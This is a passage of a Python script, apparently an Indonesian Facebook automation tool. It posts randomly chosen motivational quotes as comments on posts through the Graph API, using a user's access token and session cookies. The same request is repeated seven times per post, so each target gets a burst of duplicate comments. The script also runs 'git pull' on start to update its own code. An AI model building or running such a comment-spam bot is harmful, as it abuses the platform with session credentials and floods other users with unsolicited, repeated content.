				texs = random.choice(['"Kamu layaknyaa karya seni. Tidak semua orang akan mengerti dirimu, tetapi orang-orang yang mengerti, tidak akan pernah melupakanmu."','"Orang yang tak pernah membuat kesalahan adalah orang yang tidak pernah berbuat apa-apa." - Norman Edwin','"Belajarlah dari kesalahan orang lain. Anda tak dapat hidup cukup lama untuk melakukan semua kesalahan itu sendiri." - Martin Vanbee','"Belajar memang melelahkan, namun akan lebih melelahkan lagi bila saat ini kamu tidak belajar."','"Diam adalah lebih baik daripada mengucapkan kata-kata yang tanpa makna." - Pythagoraz','"Jika Anda takut gagal, Anda tidak pantas untuk sukses!" - Charles Barkley','"Ingin menjadi orang lain adalah tindakan untuk menyia-nyiakan dirimu sendiri." - Kurt Cobain','"Jika kamu mencari satu orang yang akan mengubah hidupmu, lihatlah di cermin."','"Terkadang kita diuji bukan untuk menunjukkan kelemahan kita, tetapi untuk menemukan kekuatan kita."','Jangan pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba','"Belajar bukan hanya mengetahui apa yang harus dilakukan, tapi melakukan apa yang sudah kita ketahui."','"Sukses adalah sebuah perjalanan, bukan sebuah tujuan. Usaha sering lebih penting daripada hasilnya."','"Kegagalan adalah kunci kesuksesan. Setiap kesalahan mengajarkan kita sesuatu."','"Kamu tidak bisa menyenangkan semua orang, dan kamu tidak bisa membuat semua orang menyukaimu," Katie Couric.','"Lakukan satu hal setiap hari yang membuatmu takut," Eleanor Roosevelt.','"Ingat, tidak ada yang bisa membuat Anda merasa rendah diri tanpa persetujuan Anda," Eleanor Roosevelt.','"Jika Anda menginginkan pelangi, Anda harus tahan dengan hujan," Dolly Parton.','"Hidup bukanlah tentang menemukan diri Anda sendiri. Hidup adalah tentang menciptakan diri Anda sendiri," George Bernard Shaw.','"Semua impian kita bisa menjadi kenyataan jika kita memiliki keberanian untuk mengejarnya," Walt Disney.','"Seseorang yang luar biasa itu sederhana dalam ucapannya, tetapi hebat dalam tindakannya."','" Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."','" Untuk mendapatkan apa yang diinginkan, kau harus bersabar dengan apa yang kau benci."','Balas dendam terbaik adalah menjadikan dirimu lebih baik."','"Jangan takut akan perubahan. Kita mungkin kehilangan sesuatu yang baik, namun kita akan peroleh sesuatu yang lebih baik lagi."','" Jika diammu bijak, maka diamlah. Apabila diammu diinjak, maka bicaralah supaya tak ada lagi orang yang menginjak dan meremehkan dirimu."','"Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal."','"Janganlah pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba." - Brian Dyson','"Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan." - Oprah Winfrey'])
				kom = ('• Belajar Itu Harus,Pintar Itu Bonus •')
				waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
				_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				#if 'id' in submit:
					#print(f"{garis} succes : {H}"+submit['id'])
				#else:
					#print(f"{garis} failed : {M}"+i['id'])
			#else:
				#print(f"{garis} selesaii ")
				input(f"{garis} Enter Untuk Kembali !!! ")
				menu()

#ex_run()
if __name__=="__main__":
	os.system('git pull')
	tools()
